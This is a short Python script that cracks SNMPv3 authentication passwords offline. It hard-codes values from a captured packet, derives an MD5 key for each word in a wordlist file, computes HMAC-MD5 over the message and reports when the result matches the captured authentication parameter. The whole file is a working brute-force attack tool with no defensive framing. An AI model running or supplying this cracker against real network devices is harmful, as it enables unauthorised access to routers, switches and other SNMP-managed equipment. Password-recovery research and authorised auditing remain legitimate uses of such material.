#python 3.5
#2019/04/29,i will leave company

import hashlib
import logging


#These argvs from capture packet
msgAuthoritativeEngineID="80001f8880e9bd0c1d12667a5100000000"
msgAuthenticationParameters="b92621f4a93d1bf9738cd5bd"
msgraw="3081800201033011020420dd06a7020300ffe30401050201030431302f041180001f8880e9bd0c1d12667a5100000000020105020120040475736572040cb92621f4a93d1bf9738cd5bd04003035041180001f8880e9bd0c1d12667a51000000000400a11e02046b4c5ac20201000201003010300e060a2b06010201041e0105010500"

msgwhole = msgraw.replace(msgAuthenticationParameters, '0'*len(msgAuthenticationParameters))


def pass2key(password, engineID):
    passlen = len(password)
    h = hashlib.md5()
    repeat = 1048576 // passlen
    remain = 1048576 % passlen
    h.update(password * repeat + password[:remain])
    ku = h.hexdigest()

    h = hashlib.md5()
    h.update(bytearray.fromhex(ku + engineID + ku))
    authKey = h.hexdigest()
    return authKey  #authkey, str


def key2param(authkey,whlmsg):
    extendAuthkey = authkey.ljust(128, '0')

    IPAD = '36' * 64
    OPAD = '5c' * 64
    K1 = format(int(IPAD, 16) ^ int(extendAuthkey, 16), 'x' )
    K2 = format(int(OPAD, 16) ^ int(extendAuthkey, 16), 'x' ) #
    # print(K1,"------" ,K2)
    # print(type(K1),type(K2))
    h=hashlib.md5()
    f=hashlib.md5()
    if len(whlmsg) % 2 != 0 :
        whlmsg = whlmsg.zfill(len(whlmsg) + 1)
    # print(len(K1 + whlmsg))
    h.update(bytearray.fromhex(K1 + whlmsg))
    f.update(bytearray.fromhex(K2 + h.hexdigest()))
    authparam = f.hexdigest()[:24]
    return authparam   #str


#
with open("dico.txt",'rb') as f:
    for pwd in f.readlines():
        if len(pwd.split()) > 1:
            continue
        password = pwd.replace(b"\n",b"").replace(b"\r",b"")
        try:
            print("Test password : ", password)
            authkey = pass2key(password,msgAuthoritativeEngineID)
            authparam = key2param(authkey,msgwhole)
            # print("authparam = ",authparam)
            if authparam == msgAuthenticationParameters:
                print(u'\u2713' * 3, "Good job!!!, Password is ", password.decode())
                break
            else:
                print(u'\u2715' * 3)
        except (KeyboardInterrupt, SystemExit) as e:
            print("\n\033[1;31mStopping brute force attack !\033[0m")
            break
        except Exception as e:
            print(Exception, e)

